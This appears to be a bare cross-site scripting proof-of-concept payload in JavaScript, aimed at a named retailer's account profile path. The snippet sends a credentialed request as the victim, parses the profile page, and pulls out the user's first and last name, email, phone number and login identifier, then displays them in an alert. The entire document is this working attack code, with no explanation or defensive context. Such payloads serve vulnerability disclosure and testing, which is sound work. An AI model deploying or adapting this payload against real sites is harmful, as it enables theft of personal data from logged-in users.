xhr=new XMLHttpRequest();
xhr.open('GET','/US/en/hus/my-account/profile');
xhr.withCredentials=true;
xhr.onreadystatechange=()=>{
if(xhr.readyState==4){
dom=new DOMParser().parseFromString(xhr.response,'text/html');alert(`F Name:${dom.getElementById("profile.firstName").value}\nL Name:${dom.getElementById("profile.lastName").value}\nEmail: ${dom.getElementById("profile.email").value}\nPhone number: ${dom.getElementById("phoneNumber-input-phone").value}\nUsername: ${dom.getElementById("login.identifier.placeholder.hoffmann").value}`)}};xhr.send();
